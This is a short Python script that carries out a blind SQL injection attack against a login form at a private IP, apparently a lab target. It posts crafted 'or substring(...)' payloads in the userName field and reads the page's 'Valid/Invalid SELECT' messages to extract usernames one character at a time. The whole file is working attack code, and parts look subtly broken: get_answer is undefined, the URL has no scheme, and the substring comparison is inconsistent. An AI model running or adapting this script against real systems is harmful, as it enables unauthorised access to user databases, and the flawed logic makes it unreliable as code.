#!/usr/bin/python3
import requests
from string import ascii_letters
from string import digits
from bs4 import BeautifulSoup
MAX_FIELD_LENGTH = 24

"""
length = 5
params = {'userName': "' or length(userName)>" + str(length) + " -- '" , 'password': ''}
print(" the answer is:", get_answer(params))
"""

def buildCharacterArray(startingChars):
    for iterChar in ascii_letters+digits:
        params = {'userName': "' or substring(userName,{},1)=\"{}\" -- '".format(len(startingChars+iterChar),startingChars+iterChar),
                  'password':''}
        r = requests.post('192.168.203.205/blind/login-clues.php', data=params)
        if isRequestValid(BeautifulSoup(r.text)):
            print("'{}' is valid".format(startingChars+iterChar))
    return


def isRequestValid(bsObj):
    if "Valid SELECT" in bsObj.find('div', {'class':'message'}).text:
        return True
    elif "Invalid SELECT" in bsObj.find('div', {'class':'message'}).text:
        return False
    else:
        print("Neither valid nor invalid found, instead found")
        print(bsObj.find('div', {'class':'message'}).text)
        return None
